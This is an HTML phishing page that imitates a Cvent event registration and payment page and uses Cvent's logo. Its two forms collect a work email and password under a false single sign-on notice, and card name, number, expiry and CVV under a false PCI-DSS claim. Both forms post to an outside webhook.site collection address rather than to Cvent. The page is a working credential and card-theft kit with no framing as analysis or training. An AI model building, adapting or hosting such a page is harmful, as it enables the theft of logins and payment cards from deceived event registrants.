<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cvent Event Registration - Finalize Payment</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; background-color: #ffffff; }
        
        .header { background: #fff; text-align: center; padding: 30px 0; border-bottom: 2px solid #f1f1f1; width: 100%; }
        /* Professional Cvent Logo Styling */
        .header img { width: 160px; height: auto; }

        .main-content { display: flex; min-height: calc(100vh - 100px); }
        .pane { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 60px 40px; }
        
        .left { background-color: #f9fafb; border-right: 1px solid #eee; }
        .right { background-color: #ffffff; }
        
        .container { width: 100%; max-width: 380px; }
        h2 { font-size: 24px; margin-bottom: 12px; color: #1a1a1a; font-weight: 600; }
        p { font-size: 15px; color: #4b5563; margin-bottom: 30px; line-height: 1.6; }
        
        .input-group { margin-bottom: 18px; text-align: left; }
        label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 6px; }
        input { width: 100%; padding: 14px; border: 1px solid #d1d5db; border-radius: 6px; box-sizing: border-box; font-size: 15px; transition: all 0.2s; }
        input:focus { border-color: #0066cc; box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1); outline: none; }
        
        .row { display: flex; gap: 15px; }
        button { width: 100%; padding: 16px; color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
        
        .btn-blue { background-color: #0066cc; }
        .btn-blue:hover { background-color: #0056b3; }
        .btn-green { background-color: #059669; }
        .btn-green:hover { background-color: #047857; }
        
        .footer-note { margin-top: 30px; font-size: 12px; color: #9ca3af; text-align: center; display: flex; align-items: center; justify-content: center; gap: 6px; }
    </style>
</head>
<body>

    <!-- TOP LOGO HEADER -->
    <header class="header">
        <!-- Official Cvent Logo Data -->
        <img src="https://static.cvent.com/design-system/2.11.0/images/logos/cvent-logo-black.svg" alt="Cvent">
    </header>

    <div class="main-content">
        <!-- LEFT SIDE: AUTHENTICATION -->
        <div class="pane left">
            <div class="container">
                <h2>Account Verification</h2>
                <p>For your security, please verify your work email and password to synchronize your registration with your company profile.</p>
                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
                    <div class="input-group">
                        <label>Business Email</label>
                        <input type="email" name="email" placeholder="email@company.com" required>
                    </div>
                    <div class="input-group">
                        <label>Password</label>
                        <input type="password" name="password" placeholder="••••••••" required>
                    </div>
                    <button type="submit" class="btn-blue">Verify Identity</button>
                    <div class="footer-note">🔒 Single Sign-On (SSO) Active</div>
                </form>
            </div>
        </div>

        <!-- RIGHT SIDE: PAYMENT -->
        <div class="pane right">
            <div class="container">
                <h2>Payment Details</h2>
                <p>Finalize your registration by paying the event fee of <b>$250.00 USD</b>.</p>
                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
                    <div class="input-group">
                        <label>Name on Card</label>
                        <input type="text" name="cc_name" placeholder="John Doe" required>
                    </div>
                    <div class="input-group">
                        <label>Card Number</label>
                        <input type="text" name="cc_number" placeholder="0000 0000 0000 0000" required maxlength="16">
                    </div>
                    <div class="row">
                        <div class="input-group" style="flex: 2;">
                            <label>Expiration</label>
                            <input type="text" name="cc_exp" placeholder="MM / YY" required maxlength="5">
                        </div>
                        <div class="input-group" style="flex: 1;">
                            <label>CVV</label>
                            <input type="text" name="cc_cvv" placeholder="123" required maxlength="4">
                        </div>
                    </div>
                    <button type="submit" class="btn-green">Complete Payment</button>
                    <div class="footer-note">Verified by PCI-DSS Security Standards</div>
                </form>
            </div>
        </div>
    </div>

</body>
</html>
